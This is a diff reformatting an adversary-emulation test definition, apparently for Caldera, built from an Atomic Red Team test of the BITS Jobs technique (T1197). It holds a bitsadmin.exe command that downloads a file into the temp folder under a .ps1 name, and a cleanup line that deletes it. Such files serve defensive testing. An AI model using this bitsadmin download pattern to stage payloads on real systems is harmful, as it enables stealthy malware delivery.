@@ -1,16 +1,18 @@
-- id: b6121568-0536-5d9c-956c-aba23c0ddc52
+- requirements: []
   name: Soumaia ART Tests - Bitsadmin Download (cmd)
   description: 'This test simulates an adversary leveraging bitsadmin.exe to download
 
     and execute a payload'
   tactic: stealth
-  technique:
-    attack_id: T1197
-    name: BITS Jobs
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1
-        cleanup: |-
-          del %temp%\bitsadmin1_flag.ps1 >nul 2>&1
+  technique_id: T1197
+  technique_name: BITS Jobs
+  executors:
+  - cleanup:
+    - del %temp%\bitsadmin1_flag.ps1 >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1
+  id: b6121568-0536-5d9c-956c-aba23c0ddc52
